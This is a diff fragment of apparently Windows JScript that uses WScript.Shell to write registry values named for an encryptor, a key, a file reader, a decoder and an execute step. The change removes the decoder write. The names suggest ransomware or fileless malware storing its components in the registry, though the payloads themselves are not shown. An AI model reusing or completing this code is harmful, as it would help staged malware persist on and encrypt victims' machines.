@@ -14,5 +14,4 @@ var wsh = new ActiveXObject("WScript.Shell");
 wsh.RegWrite (encryptorHive, encryptor, "REG_SZ");
 wsh.RegWrite (pkHive, pk, "REG_SZ");
 wsh.RegWrite (fileReaderHive, fileReader, "REG_SZ");
-wsh.RegWrite (decoderHive, decoder, "REG_SZ");
 wsh.RegWrite (executeRegHive, execute, "REG_SZ");
